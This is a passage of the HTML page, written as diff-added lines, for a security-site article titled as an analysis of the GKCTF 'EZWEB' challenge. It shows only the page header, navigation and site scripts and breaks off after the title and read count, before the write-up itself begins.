@@ -1,0 +1,1615 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0,minimum-scale=1.0">
+            <title>GKCTF EZWEB的分析题解和思考 - 安全客，安全资讯平台</title>
+                <meta name="description" content="总的来说，做的这三个EZ题目难度没有特别大，但是出的质量也还挺好的，也是强化了一些思维，比如针对url想到CRLF或者SSRF探测内网，nodejs题目多往沙箱逃逸方向思考，善于利用Github等等。"/>
+                <meta name="keywords"
+              content="安全媒体,安全资讯,安全知识, 安全热点,安全招聘,安全趋势,移动安全,网站安全,终端安全,无线安全,工控安全,物联网安全,WEB安全,系统安全,网络安全,区块链安全,安全活动,信息安全,安全预警,安全会议"/>
+        <meta name="csrf-token" content="kWML8J0jxIb4KmWbspTUo3Pdpb9fjSQGFujqdI8k">
+    <link rel="stylesheet" href="https://static.anquanke.com/bootstrap/css/bootstrap.min.css?v1.2">
+    <link rel="stylesheet" href="/css/style.css?v1.1.1">
+    <link rel="shortcut icon" href="https://p0.ssl.qhimg.com/t01b2a1553a7bc927cb.ico?v=1.2"/>
+    <link href="https://lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <script src="https://lib.baomitu.com/jquery/3.2.1/jquery.min.js"></script>
+    <script src="https://static.anquanke.com/bootstrap/js/bootstrap.min.js"></script>
+    <script src="https://lib.baomitu.com/axios/0.17.1/axios.min.js"></script>
+    <script src="https://lib.baomitu.com/purl/2.3.1/purl.min.js"></script>
+    <script src="https://lib.baomitu.com/handlebars.js/4.0.11/handlebars.min.js"></script>
+    <script src="https://lib.baomitu.com/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+    <script src="https://www.anquanke.com/js/site.min.js?v1.0.5"></script>
+    <script src="https://www.anquanke.com/js/xss.min.js?v1.0.0"></script>
+    <script src="https://lib.baomitu.com/jquery.sticky/1.0.4/jquery.sticky.min.js"></script>
+    <script type="text/javascript">
+    </script>
+</head><body data-spy="scroll" data-target="#article-index" data-offset="30">
+<!--头部导航 -->
+<header>
+    <div class="navbar navbar-dark bg-dark header-navbar fixed-top" style="z-index:100;">
+
+        <div class="container d-flex justify-content-between">
+            <nav class="navbar navbar-expand-lg navbar-dark bg-dark header-navbar">
+                <a href="https://www.anquanke.com" class="navbar-brand">
+                    <img style="height: 36px;width: 110px"
+                         src="/img/job/logo.svg">
+                </a>
+                <div class="collapse navbar-collapse header-height" style="margin-left:35px;">
+                    <!--导航菜单-->
+                    <ul class="navbar-nav mr-auto">
+                        <li class="nav-item active header-menu-item">
+                            <a class="nav-link" href="/">首页</a>
+                        </li>
+                        <li class="nav-item dropdown header-menu-item header-nav-item-post">
+                            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button"
+                               data-toggle="dropdown" aria-haspopup="true"
+                               aria-expanded="false">
+                                文章
+                            </a>
+                            <div class="header-pop-window-wrapper">
+                                <div class="header-pop-window">
+                                    <div style="background-color:white;width: 100%;padding-bottom: 15px;">
+                                        <div class="header-pop-menu-container">
+                                            <div class="row">
+                                                <div class="col col-8">
+                                                    <div style="font-weight:bolder;position:relative;font-size:18px;">
+                                                        <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>文章分类
+                                                    </div>
+                                                    <div style="line-height:1.8;font-weight:normal;">
+                                                        <a href="/knowledge">安全知识</a><span class="seprator">|</span>
+                                                        <a href="/news">安全资讯</a><span class="seprator">|</span>
+                                                        <a href="/activity">安全活动</a><span class="seprator">|</span>
+                                                        <a href="/tool">安全工具</a><span class="seprator">|</span><br/>
+                                                        <a href="/job">招聘信息</a>
+                                                    </div>
+                                                </div>
+                                                <div class="col col-6">
+                                                    <div style="font-weight:bolder;position:relative;font-size:18px;">
+                                                        <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>内容精选
+                                                    </div>
+                                                    <div style="line-height:1.8;font-weight:normal;">
+                                                        <a href="/week-list">360网络安全周报</a><span
+                                                                class="seprator">|</span>
+                                                        <a href="/discovery"
+                                                           style="color:red !important;font-weight:bold">安全客季刊</a>
+                                                        <span
+                                                                class="seprator">|</span>
+                                                        <br/>
+                                                        <a href="/subject-list">专题列表</a>
+                                                    </div>
+                                                </div>
+                                                <div class="col col-10">
+                                                    <div style="font-weight:bolder;position:relative;font-size:18px;">
+                                                        <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>热门标签
+                                                    </div>
+                                                    <div style="line-height:1.8;font-weight:normal;">
+                                                                                                                    <a href="/tag/活动">
+                                                                <nobr>活动</nobr>
+                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/CTF">
+                                                                <nobr>CTF</nobr>
+                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/安全活动">
+                                                                <nobr>安全活动</nobr>
+                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/恶意软件">
+                                                                <nobr>恶意软件</nobr>
+                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/每日安全热点">
+                                                                <nobr>每日安全热点</nobr>
+                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/网络安全热点">
+                                                                <nobr>网络安全热点</nobr>
+                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/Web安全">
+                                                                <nobr>Web安全</nobr>
+                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/漏洞预警">
+                                                                <nobr>漏洞预警</nobr>
+                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/渗透测试">
+                                                                <nobr>渗透测试</nobr>
+                                                            </a><span class="seprator">|</span>                                                             <a href="/tag/Pwn">
+                                                                <nobr>Pwn</nobr>
+                                                            </a><span class="seprator">|</span>                                                     </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </li>
+                    
+                        <li class="nav-item header-menu-item">
+                            <a class="nav-link" href="/src">SRC导航</a>
+                        </li>
+                                                    <li class="nav-item header-menu-item" style="position: relative">
+                                <img class="new-module-icon" src="/img/job/new.svg"
+                                     alt="">
+                                <a class="nav-link" href="/job-list">招聘</a>
+                            </li>
+                                                <li class="nav-item header-menu-item">
+                            <a class="nav-link" href="/discovery">内容精选</a>
+                        </li>
+                    </ul>
+                    <!--搜索-->
+
+                </div>
+            </nav>
+            <div class="hide-in-mobile-device">
+                <div class="header-height" style="float: left;">
+                    <fieldset>
+                        <div class="search-form" style="display: flex;position: relative;align-items: center; width: 160px;height: 28px;border-radius: 3px;margin-top: 16px;background: rgba(255,255,255,0.3);">
+                            <input class="search-input" placeholder="输入关键词搜索" name="s" id="search" value="" type="text">
+                            <img class="search-icon" src="https://p0.ssl.qhimg.com/t010133a1346bd31419.png" alt="" onclick="if($('#search').val())window.location.href = '/search?s=' + $('#search').val();">
+                        </div>
+                    </fieldset>
+                </div>
+                <div class="header-height" style="float: left;position: relative">
+                    <img class="app-qrcode" src="https://p0.ssl.qhimg.com/t01103704213901dd1e.png" alt="">
+                    <a href="/app" class="nav-a" style="" id="app-logo">
+                        <img src="https://p0.ssl.qhimg.com/t0161d2c7f7fe89cb91.png"
+                             style="height:25px;width: 25px "/>
+                    </a>
+                    <!--投稿按钮-->
+                </div>
+                <div class="header-height flex-align-center" style="float: left;">
+                    <div class="flex-align-center"
+                         onclick="if(getLocalUserInfo()){if(getLocalUserInfo().isLogin)window.location.href='/contribute/new';else window.location.href='/login';}"
+                         style="margin: 0 6px;width: 93px;height: 28px;border-radius: 3px;background-repeat:no-repeat;background-size:93px 28px;background-image: url('https://p0.ssl.qhimg.com/t0109289cf085c07c09.png')">
+                        <span class="contribution-span"><img class="contribution-icon" src="https://p0.ssl.qhimg.com/t01e18bc83d1362b57e.png"
+                                   alt="投稿">投稿</span>
+                    </div>
+                </div>
+                <div id="login-button" class="hide-in-mobile-device" style="display:none;float: left">
+
+                    <a href="/login" class="nav-a">
+                        <div class="flex-align-center"
+                             style="width: 55px;height: 28px;border-radius: 3px;background-repeat:no-repeat;background-size:55px 28px;background-image: url('https://p0.ssl.qhimg.com/t01f944ea739c7785ca.png')">
+                        <span class="contribution-span">登录</span>
+                        </div>
+                    </a>
+                    <a href="/register" class="nav-a">
+                        <div class="flex-align-center"
+                             style="width: 55px;height: 28px;border-radius: 3px;background-repeat:no-repeat;background-size:55px 28px;background-image: url('https://p0.ssl.qhimg.com/t01f944ea739c7785ca.png')">
+                        <span class="contribution-span">注册</span>
+                        </div>
+                    </a>
+                </div>
+                <div id="navigation-user-info" class="hide-in-mobile-device" style="display:none;float: left;">
+                    <a style="position: relative;">
+                        <img class="avatar" id="user-avatar" style="width:40px;height:40px;">
+                        <div class="msg-count-icon unread_count" style="display: none"><span class="msg-count-container unread_count_span"></span></div>
+                    </a>
+
+                    <div class="user-opition-menu">
+                        <div class="row" id="user-option-menu-corner"></div>
+                        <ul>
+                            <li>
+                                <a id="my-home-page" href="#">
+                                    <svg width="20px" height="20px" viewBox="0 0 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+                                        <title>主页2</title>
+                                        <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                                            <g id="个人账户" transform="translate(-1439.000000, -74.000000)" fill-rule="nonzero">
+                                                <g id="编组-2" transform="translate(1424.000000, 57.000000)">
+                                                    <g id="主页2" transform="translate(15.000000, 17.000000)">
+                                                        <rect id="矩形" fill="#000000" opacity="0" x="0" y="0" width="20" height="20"></rect>
+                                                        <path d="M18.5722656,8.46679688 L10.5039062,2.22070313 L10.3847656,2.0703125 C10.2265625,1.86914063 9.93359375,1.83398438 9.73242187,1.9921875 L9.69335937,2.02148438 C9.6796875,2.02929688 9.66601562,2.0390625 9.65429687,2.05078125 L1.42578125,8.49414063 C1.22460937,8.65234375 1.18945312,8.9453125 1.34765625,9.14648438 L1.4921875,9.33007813 C1.65039062,9.53125 1.94335937,9.56640625 2.14453125,9.40820313 L3.50390625,8.34375 L3.50390625,16.25 C3.50390625,17.2734375 4.33398438,18.1035156 5.35742188,18.1035156 L14.6347656,18.1035156 C15.6582031,18.1035156 16.4882812,17.2753906 16.4882812,16.25 L16.4882812,8.3125 L17.8535156,9.37109375 C18.0546875,9.52734375 18.3476562,9.4921875 18.5058594,9.29296875 L18.6503906,9.11132813 C18.8085938,8.91210938 18.7734375,8.62304688 18.5722656,8.46679688 L18.5722656,8.46679688 Z M15.3300781,15.7910156 L15.296875,15.7910156 C15.3164062,15.8652344 15.3300781,15.9414062 15.3300781,16.0234375 C15.3300781,16.5371094 14.9140625,16.9511719 14.4023438,16.9511719 L5.59179688,16.9511719 C5.078125,16.9511719 4.6640625,16.5351562 4.6640625,16.0234375 C4.6640625,15.9414062 4.67773438,15.8652344 4.69726562,15.7910156 L4.6640625,15.7910156 L4.6640625,7.4375 L9.97851562,3.27539062 L15.3300781,7.41796875 L15.3300781,15.7910156 Z M11.3886719,10.2226562 L8.60546875,10.2226562 C8.09179688,10.2226562 7.67773437,10.6386719 7.67773437,11.1503906 L7.67773437,13.9335937 C7.67773437,14.4472656 8.09375,14.8613281 8.60546875,14.8613281 L11.3886719,14.8613281 C11.9023438,14.8613281 12.3164062,14.4453125 12.3164062,13.9335937 L12.3164062,11.1503906 C12.3144531,10.6386719 11.9003906,10.2226562 11.3886719,10.2226562 Z M11.3886719,13.7011719 C11.3886719,13.828125 11.2851562,13.9335938 11.15625,13.9335938 L8.83789062,13.9335938 C8.7109375,13.9335938 8.60546875,13.8300781 8.60546875,13.7011719 L8.60546875,11.3828125 C8.60546875,11.2558594 8.70898438,11.1503906 8.83789062,11.1503906 L11.15625,11.1503906 C11.2832031,11.1503906 11.3886719,11.2539062 11.3886719,11.3828125 L11.3886719,13.7011719 Z" id="形状" fill="#585858"></path>
+                                                    </g>
+                                                </g>
+                                            </g>
+                                        </g>
+                                    </svg>
+                                    个人主页</a>
+                            </li>
+                            <li style="">
+                                <a id="my-home-page" href="/setting?p=message" style="vertical-align: middle;">
+                                    <svg width="20px" height="20px" viewBox="0 0 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+                                        <title>消息</title>
+                                        <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                                            <g id="个人账户" transform="translate(-420.000000, -458.000000)" fill-rule="nonzero">
+                                                <g id="消息" transform="translate(420.000000, 458.000000)">
+                                                    <rect id="矩形" fill="#000000" opacity="0" x="0" y="0" width="20" height="20"></rect>
+                                                    <g id="编组" transform="translate(2.500000, 1.250000)" fill="#585858">
+                                                        <path d="M14.7831453,0 L0.613917989,0 C0.274860446,0 -1.01030295e-13,0.274860446 -1.01030295e-13,0.613917989 L-1.01030295e-13,13.0150614 C-1.01030295e-13,13.1778826 0.0646804531,13.3340351 0.17981241,13.449167 C0.294944367,13.564299 0.451096812,13.6289795 0.613917989,13.6289795 L6.07164895,13.6289795 L6.07164895,12.4011435 L1.23397516,12.4011435 L1.23397516,1.22783598 L14.1692273,1.22783598 L14.1692273,12.3950043 L12.0941845,12.3950043 C11.971743,12.3947309 11.8520167,12.4310763 11.7503904,12.4993703 L5.96114371,16.3854712 L6.64873187,17.4107143 L12.284499,13.6289795 L14.7831453,13.6289795 C14.9459665,13.6289795 15.1021189,13.564299 15.2172509,13.449167 C15.3323828,13.3340351 15.3970633,13.1778826 15.3970633,13.0150614 L15.3970633,0.613917989 C15.3970633,0.274860446 15.1222028,0 14.7831453,0 Z" id="路径"></path>
+                                                        <path d="M3.71420386,6.81448973 C3.71420386,7.30273259 4.1100029,7.69853163 4.59824576,7.69853163 C5.08648863,7.69853163 5.48228767,7.30273259 5.48228767,6.81448973 C5.48228767,6.32624686 5.08648863,5.93044782 4.59824576,5.93044782 C4.1100029,5.93044782 3.71420386,6.32624686 3.71420386,6.81448973 Z" id="路径"></path>
+                                                        <path d="M6.81448973,6.81448973 C6.81448973,7.30273259 7.21028877,7.69853163 7.69853163,7.69853163 C8.1867745,7.69853163 8.58257354,7.30273259 8.58257354,6.81448973 C8.58257354,6.32624686 8.1867745,5.93044782 7.69853163,5.93044782 C7.21028877,5.93044782 6.81448973,6.32624686 6.81448973,6.81448973 L6.81448973,6.81448973 Z" id="路径"></path>
+                                                        <path d="M9.9147756,6.81448973 C9.9147756,7.30273259 10.3105746,7.69853163 10.7988175,7.69853163 C11.2870604,7.69853163 11.6828594,7.30273259 11.6828594,6.81448973 C11.6828594,6.32624686 11.2870604,5.93044782 10.7988175,5.93044782 C10.3105746,5.93044782 9.9147756,6.32624686 9.9147756,6.81448973 Z" id="路径"></path>
+                                                    </g>
+                                                </g>
+                                            </g>
+                                        </g>
+                                    </svg>
+                                    我的消息</a>
+                                <div class="drop-msg-count-icon unread_count" style="display: none"><span class="drop-msg-count-container unread_count_span"></span></div>
+                            </li>
+                            <li>
+                                <a href="/setting">
+                                    <svg width="20px" height="20px" viewBox="0 0 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+                                        <title>设置</title>
+                                        <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                                            <g id="个人账户" transform="translate(-420.000000, -294.000000)" fill-rule="nonzero">
+                                                <g id="设置" transform="translate(420.000000, 294.000000)">
+                                                    <rect id="矩形" fill="#000000" opacity="0" x="0" y="0" width="20" height="20"></rect>
+                                                    <path d="M4.36479372,5.04181819 L3.37724827,6.75181819 L4.55665735,7.43295456 L4.37052099,8.30554546 C4.28234797,8.72001599 4.23805838,9.14261819 4.23838464,9.56636363 C4.23838464,9.99468181 4.28297554,10.4160455 4.37052099,10.8267727 L4.55665735,11.6997727 L3.37724827,12.3805 L4.36479372,14.0909091 L5.54297554,13.411 L6.20652099,14.0135909 C6.84051607,14.5908455 7.59086683,15.025516 8.40702099,15.2883182 L9.25874827,15.5615909 L9.25874827,16.9054546 L11.2338392,16.9054546 L11.2338392,15.5615909 L12.0855664,15.2883182 C12.901866,15.0255691 13.652361,14.5908957 14.2864755,14.0135909 L14.9492028,13.411 L16.1277937,14.0909091 L17.1153392,12.3809091 L15.9359301,11.6997727 L16.1220664,10.8267727 C16.2096119,10.4160455 16.2542028,9.99468183 16.2542028,9.56636363 C16.2542028,9.13804546 16.2096119,8.71627273 16.1220664,8.30554546 L15.9359301,7.43295456 L17.1153392,6.75181819 L16.1277937,5.04181819 L14.9496119,5.72213637 L14.2860664,5.11913637 C13.6520332,4.54202878 12.9016852,4.10749932 12.0855664,3.84481819 L11.2338392,3.57113637 L11.2338392,2.22727273 L9.25874827,2.22727273 L9.25874827,3.57113637 L8.40702099,3.84481819 C7.59075682,4.10744631 6.84026454,4.54197855 6.20611191,5.11913637 L5.54338464,5.72213637 L4.36479372,5.0414091 L4.36479372,5.04181819 Z M8.03147554,1.82104546 C8.03147554,1.36777273 8.39393008,1 8.84924827,1 L11.6433392,1 C12.0949755,1 12.4611119,1.36736363 12.4611119,1.82104546 L12.4611119,2.67604546 C13.444298,2.99252969 14.3482346,3.51605965 15.112021,4.21136363 L15.8659755,3.77568183 C16.0537884,3.66590485 16.2776283,3.63556853 16.487885,3.69139638 C16.6981418,3.74722423 16.877449,3.88460511 16.9860664,4.07309092 L18.3831119,6.49286363 C18.6089301,6.88395454 18.473521,7.38468181 18.0807937,7.61172727 L17.3223392,8.04945456 C17.4266574,8.53872729 17.4818846,9.04600002 17.4818846,9.56636363 C17.4818846,10.0863182 17.4266574,10.594 17.3223392,11.0828636 L18.0807937,11.5205909 C18.473521,11.7476364 18.6105664,12.2450909 18.3831119,12.6394546 L16.9860664,15.0592273 C16.8771288,15.2473641 16.6978594,15.384469 16.487759,15.4403321 C16.2776585,15.4961952 16.0539679,15.4662323 15.8659755,15.3570455 L15.1116119,14.9213636 C14.3477874,15.6165207 13.4438536,16.1399095 12.4607028,16.4562727 L12.4607028,17.3112727 C12.4617917,17.5287214 12.3761447,17.7376318 12.2227293,17.8917383 C12.0693139,18.0458448 11.8607905,18.1323183 11.6433392,18.1323183 L8.84924827,18.1323183 C8.63189385,18.1319932 8.42358291,18.0452815 8.27019718,17.8912819 C8.11681145,17.7372823 8.03093245,17.5286267 8.03147554,17.3112727 L8.03147554,16.4562727 C7.04832477,16.1399095 6.14439092,15.6165207 5.38056645,14.9213636 L4.62661191,15.3570455 C4.43874933,15.4667885 4.214872,15.4970625 4.00460935,15.4411563 C3.7943467,15.3852501 3.61506979,15.2477824 3.50652099,15.0592273 L2.10988464,12.6394546 C2.00159092,12.4510637 1.97260377,12.2273587 2.0293047,12.0175882 C2.08600564,11.8078178 2.22374622,11.6291793 2.41220281,11.521 L3.17065735,11.0832727 C3.06452882,10.5846216 3.01118943,10.0761833 3.01152099,9.56636363 C3.01152099,9.046 3.06633916,8.53872727 3.17106645,8.04945456 L2.41220281,7.61172727 C2.22321861,7.50393731 2.08503553,7.32521826 2.02828489,7.11518714 C1.97153425,6.90515602 2.00090434,6.68116393 2.10988464,6.49286363 L3.50693008,4.07309092 C3.61593611,3.88502343 3.79523567,3.74800519 4.00533029,3.69222039 C4.21542491,3.63643558 4.43907825,3.66646085 4.62702099,3.77568183 L5.38097554,4.21136363 C6.14480002,3.51620661 7.04873387,2.99281776 8.03188464,2.67645456 L8.03188464,1.82104546 L8.03147554,1.82104546 Z M10.2671574,13.0354546 C9.02777053,13.0354546 7.88252987,12.3742496 7.26283645,11.3009091 C6.64314303,10.2275686 6.64314303,8.90515864 7.26283645,7.83181817 C7.88252987,6.7584777 9.02777053,6.09727273 10.2671574,6.09727273 C12.1830833,6.09727273 13.7362482,7.65043767 13.7362482,9.56636364 C13.7362482,11.4822896 12.1830833,13.0354546 10.2671574,13.0354546 Z M10.2671574,11.8081818 C11.5052793,11.8081818 12.5089755,10.8044856 12.5089755,9.56636364 C12.5089755,8.32824165 11.5052793,7.32454546 10.2671574,7.32454546 C9.02903536,7.32454546 8.02533917,8.32824165 8.02533917,9.56636364 C8.02533917,10.8044856 9.02903536,11.8081818 10.2671574,11.8081818 L10.2671574,11.8081818 Z" id="形状" fill="#585858"></path>
+                                                </g>
+                                            </g>
+                                        </g>
+                                    </svg>
+                                    个人设置</a>
+                            </li>
+                            <li onclick="logout();">
+                                <a href="javascript:void(0)">
+                                <svg width="20px" height="20px" viewBox="0 0 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+                                    <title>关闭</title>
+                                    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                                        <g id="个人账户" transform="translate(-1439.000000, -179.000000)" fill-rule="nonzero">
+                                            <g id="编组-2" transform="translate(1424.000000, 57.000000)">
+                                                <g id="关闭" transform="translate(15.000000, 122.000000)">
+                                                    <rect id="矩形" fill="#000000" opacity="0" x="0" y="0" width="20" height="20"></rect>
+                                                    <path d="M10,17.6136364 C8.98780811,17.6136364 8.00563212,17.4264953 7.08030745,17.0580203 C6.63422082,16.880037 6.20749621,16.6617147 5.80612245,16.4061174 C5.40798713,16.1525556 5.0364973,15.8636914 4.69672674,15.5434701 C4.35692855,15.2232748 4.05040451,14.8731877 3.78134111,14.4979902 C3.51014701,14.1197559 3.27854206,13.7176128 3.08978267,13.2972151 C2.69858203,12.4252013 2.5,11.4996116 2.5,10.5457354 C2.5,9.59185909 2.69858203,8.6662694 3.08978267,7.79425564 C3.27763053,7.37520199 3.51040286,6.97132193 3.78134111,6.59348052 C4.05040451,6.21828305 4.35692855,5.86819594 4.69672674,5.54800065 C4.98953088,5.27187857 5.46441823,5.27187857 5.75742115,5.54800065 C6.05022528,5.8239354 6.05022528,6.27146298 5.75742115,6.54758506 C5.20600318,7.06704675 4.77345614,7.67174286 4.47111052,8.34500118 C4.15862709,9.04186287 4,9.78199743 4,10.5457354 C4,11.309286 4.15862709,12.0497952 4.47111052,12.7464696 C4.77345614,13.4195405 5.20600318,14.024424 5.75742115,14.5438857 C6.30864034,15.0635347 6.9503048,15.4711613 7.66472303,15.7560878 C8.40418765,16.0505681 9.18976941,16.2000562 10,16.2000562 C10.8102306,16.2000562 11.5960111,16.0505681 12.335277,15.7560878 C13.0494964,15.4711613 13.6913597,15.0635347 14.2425788,14.5438857 C14.7939968,14.024424 15.2265439,13.4197279 15.5288895,12.7464696 C15.8413729,12.0496079 16,11.309286 16,10.5457354 C16,9.78199743 15.8413729,9.04167554 15.5288895,8.34500118 C15.2265439,7.67193019 14.7939968,7.06704675 14.2425788,6.54739773 C13.9497747,6.27146298 13.9497747,5.8239354 14.2425788,5.54800065 C14.5355818,5.27187857 15.0102703,5.27187857 15.3032733,5.54800065 C15.6430715,5.86819594 15.9495955,6.21828305 16.2186589,6.59348052 C16.4897783,6.97175757 16.7213792,7.37389366 16.9102173,7.79425564 C17.301418,8.6662694 17.5,9.59185909 17.5,10.5457354 C17.5,11.4996116 17.301418,12.4252013 16.9102173,13.2972151 C16.721422,13.7175965 16.4898189,14.1197364 16.2186589,14.4979902 C15.9495955,14.8731877 15.6430715,15.2232748 15.3032733,15.5434701 C14.9635027,15.8636914 14.5920129,16.1525556 14.1938776,16.4061174 C13.7924792,16.6616765 13.3657586,16.8799968 12.9196926,17.0580203 C11.9943679,17.4266826 11.0121919,17.6136364 10,17.6136364 L10,17.6136364 Z M10.6818182,10 L10.6818182,2.04545455 C10.6818182,1.60608872 10.3765993,1.25 10,1.25 C9.62340072,1.25 9.31818182,1.60608872 9.31818182,2.04545455 L9.31818182,10 C9.31818182,10.4393658 9.62340072,10.7954545 10,10.7954545 C10.3765993,10.7954545 10.6818182,10.4393658 10.6818182,10 Z" id="形状" fill="#585858"></path>
+                                                </g>
+                                            </g>
+                                        </g>
+                                    </g>
+                                </svg>
+                                退出登录</a>
+                            </li>
+                        </ul>
+                    </div>
+
+                </div>
+            </div>
+
+            <div class="show-in-mobile-device"
+                 onclick="switchMobileMenu()"
+                 style="width: 40px;height: 60px;line-height: 60px; cursor: pointer;font-size: 28px;color: white">
+                <i class="fa fa-bars"></i>
+            </div>
+        </div>
+    </div>
+</header>
+<style>
+    #mobile-menu {
+        position: fixed;
+        width: 100%;
+        top: 60px;
+        left: 0;
+        background: #1dada7;
+        height: 0;
+        z-index: 50;
+        overflow: hidden;
+        box-shadow: 0 0 3rem #444;
+    }
+
+    #mobile-menu ul {
+        padding: 0px;
+    }
+
+    #mobile-menu li {
+        color: rgba(255, 255, 255, 0.7);
+        font-size: 0.9rem;
+        margin-top: 20px;
+        padding-left: 12px;
+    }
+    .new-module-icon {
+        position: absolute;
+        top: 10px;
+        right: -15px;
+    }
+    .online-alter-notice {
+        display: none;
+        position: absolute;
+        white-space: nowrap;
+        background: rgba(255,255,255,1);
+        box-shadow: 2px 2px 4px 0px rgba(160,160,160,0.5);
+        border: 1px solid rgba(230,234,241,1);
+    }
+    .online-notice-content {
+        align-items: center;
+        padding: 15px 20px 15px 15px;
+        line-height: 30px;
+        font-size: 16px;
+        font-weight: 400;
+    }
+    .online-notice-content img {
+        width: 16px;
+        height: 16px;
+        margin-right: 5px;
+    }
+    .alert-corner {
+        display: none;
+        width: 10px;
+        height: 10px;
+        background:  rgba(255,255,255,1);
+        transform: rotate(45deg);
+        position: absolute;
+        left: 30px;
+        bottom: -5px;
+        z-index: 1;
+    }
+</style>
+<div id="mobile-menu" class="show-in-mobile-device">
+    <ul>
+        <li class="mobile-menu-item" data-url="/">首页</li>
+        <li class="mobile-menu-item" data-url="/knowledge">安全知识</li>
+        <li class="mobile-menu-item" data-url="/news">安全资讯</li>
+        <li class="mobile-menu-item" data-url="/job">招聘信息</li>
+        <li class="mobile-menu-item" data-url="/activity">安全活动</li>
+        <li class="mobile-menu-item" data-url="/app">APP下载</li>
+    </ul>
+</div>
+<script>
+    var menuExpand = false;
+
+    function switchMobileMenu() {
+        if (!menuExpand) {
+            $("#mobile-menu").animate({"height": "265px"});
+            menuExpand = true;
+        }
+        else {
+            $("#mobile-menu").animate({"height": "0px"});
+            menuExpand = false;
+        }
+    }
+
+    $(".mobile-menu-item").click(function () {
+        window.location.href = $(this).data("url");
+    });
+</script>
+
+<script>
+    var status;
+
+    function updateLoginStatus(status) {
+        if (status.isLogin) {
+            $("#navigation-user-info").show();
+            $("#user-avatar").attr("src", getResizedQihooImg(status.user.avatar, 90, 90));
+            $("#my-home-page").attr("href", "/member/" + status.user.id);
+            $(".comment-login").show();
+            $(".comment-login .avatar").attr("data-original", getResizedQihooImg(status.user.avatar, 90, 90));
+            $(".comment-login .avatar").lazyload();
+            $(".comment-login a").attr("href", "/member/" + status.user.id);
+            $(".comment-login .nickname").text(status.user.nickname);
+            $(".comment-not-login").hide();
+        }
+        else {
+            $("#login-button").show();
+            $(".comment-login").hide();
+            $(".comment-not-login").show();
+        }
+    }
+
+    function getMessageCount() {
+        axios.post(api("msg/user/unread")).then(function (res) {
+            if(res.data.code==0)
+            {
+                if(res.data.unread_count>0)
+                {
+                    $(".unread_count").show();
+                    if (res.data.unread_count > 99) {
+                        $(".unread_count_span").css('top','-3px');
+                        $(".unread_count_span").text('...');
+
+                    } else {
+                        $(".unread_count_span").text(res.data.unread_count);
+                    }
+                }
+
+            }
+            console.log(res.data);
+        });
+    }
+    getMessageCount();
+
+    function logout() {
+        axios.post(api("user/logout")).then(function (res) {
+            deleteUserInfo();
+            window.location.href = "/";
+
+        });
+    }
+
+    $(".header-nav-item-post").hover(
+        function () {
+            $(".header-pop-window-wrapper").css("visibility", "visible");
+            $(".header-pop-window").css("transform", "translate(0,0)");
+        },
+        function () {
+            $(".header-pop-window").css("transform", "translate(0,-100%)");
+            $(".header-pop-window-wrapper").css("visibility", "hidden");
+        });
+    if (!getLocalUserInfo()) {
+        axios.get(api("user/status")).then(function (res) {
+            if (res.status === 200) {
+                saveLocalUserInfo(res.data);
+                updateLoginStatus(getLocalUserInfo());
+            }
+        })
+    }
+    else {
+        updateLoginStatus(getLocalUserInfo());
+    }
+    $('#app-logo').on('mouseover', function () {
+        $(".app-qrcode").show();
+    })
+    $('#app-logo').on('mouseleave', function () {
+        $(".app-qrcode").hide();
+    })
+</script>
+<script>
+    $('.prepare-online').click(function () {
+        $('.alert-corner').show();
+        $('.online-alter-notice').show();
+        setTimeout(function () {
+            $('.alert-corner').fadeOut();
+            $('.online-alter-notice').fadeOut();
+        }, 3000)
+    });
+</script>
+<!--头部导航end--><style>
+    .highslide-viewport-size {
+        position: fixed;
+        width: 100%;
+        height: 100%;
+        left: 0;
+        top: 0;
+    }
+</style>
+<script src="https://res.wx.qq.com/open/js/jweixin-1.2.0.js"></script>
+<script src="https://static.anquanke.com/highslide/highslide.js"></script>
+<link rel="stylesheet" type="text/css" href="https://static.anquanke.com/highslide/css/style.css"/>
+<link href="https://lib.baomitu.com/malihu-custom-scrollbar-plugin/3.1.5/jquery.mCustomScrollbar.min.css" rel="stylesheet">
+<script src="https://lib.baomitu.com/malihu-custom-scrollbar-plugin/3.1.5/jquery.mCustomScrollbar.min.js"></script>
+<script src="https://lib.baomitu.com/layer/3.1.1/layer.js"></script><main role="main" style="min-height:1000px;padding-top:76px;">
+    <div class="container d-flex justify-content-between">
+        <div class="row" style="width:100%">
+            <div class="col col-xs-24 col-sm-24 col-md-24 col-lg-18">
+                <div class="common-left-content-container article-detail"
+                     style="background-color:white;overflow:hidden;">
+                    <h1>
+                        GKCTF EZWEB的分析题解和思考
+                    </h1>
+                    <p class="article-top-info" style="margin-bottom: 10px;position:relative;">
+                            <span>
+                                阅读量 &nbsp;&nbsp;
+                                <b>178855</b>
+                            </span>
+                        <span style="color:#cccccc;margin-left:20px;margin-right:20px;">|</span>
+                        <span>
